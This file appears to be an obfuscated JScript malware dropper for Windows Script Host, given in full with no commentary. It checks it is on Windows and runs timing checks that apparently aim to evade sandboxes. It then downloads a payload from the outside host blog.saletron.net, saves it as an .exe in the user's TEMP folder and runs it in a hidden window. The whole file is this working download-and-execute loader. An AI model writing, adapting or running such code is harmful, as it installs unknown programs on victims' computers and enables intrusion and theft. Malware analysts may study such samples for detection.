var A = false;
var cu = "CreateObject";
var f = function P() {return WScript[cu]("WScript.Shell");}(), MB = 11;
var rB = "MSXML2.XMLHTTP";
var UQ = 2123213;
var y = 0;
function z(r){f["Run"](r, y, y);};
function PA(){return "" + rB;};
function N(yC, R){y = y * 1; return yC - R;};
function I(){return cu;};
/*@cc_on
  @if (@_win32 || @_win64)
    A = true;
  @end
@*/
if (A)
{
var u = "";
function B(){return 22;};
var rn = 0; var g = 0;
function mI()
{
var jT = new this["Date"]();
var mz = jT["getUTCMilliseconds"]();
WScript["Sleep"](B());
var jT = new this["Date"]();
var rE = jT["getUTCMilliseconds"]();
WScript["Sleep"](B());
var jT = new this["Date"]();
var ju = jT["getUTCMilliseconds"]();
var rn = "b";
rn = N(rE, mz);
var g = "hM";
g = N(ju, rE);
u = "open";
return N(rn, g);
}
var yY = false;
var a = false;
for (var T = y; T < B() * 1; T++){if (mI() != y){
yY = true; 
g = "31" + 11 * rn + g; 
a = true; 
break;
}}
function p() {return ((yY == true) && (yY == a)) ? 1 : y;};
if (yY && p() && a){
function uc() {return f["ExpandEnvironmentStrings"]("%TE"+"MP%/") + "hk4ZbrIHnbx.exe";};
 d = PA();
 g0 = WScript[cu](d);
 var yp = 1;
 while (yp){
try {
g0[u]("GET", "http://blog.saletron.net/li9soz", false);
g0["send"]();
X = "Sleep";
for (;;){WScript[X](B() * 11); if (g0["readystate"] >= 2 * 2) break;};
yp = y;
} catch(GJ){};
}
function wp(Kh) {var EH = (1, 2, 3, 4, 5, Kh); return EH;};
Yn = WScript[I()]("ADODB.Stream");
d = Yn;
d[u]();
d["type"] = wp(1);
d["write"](g0["ResponseBody"]);
Yn["position"] = wp(y);
d["Save" + "ToFile"](uc(), 2);
Yn["c"+"lose"]();
s = uc();
z(s);
}
}

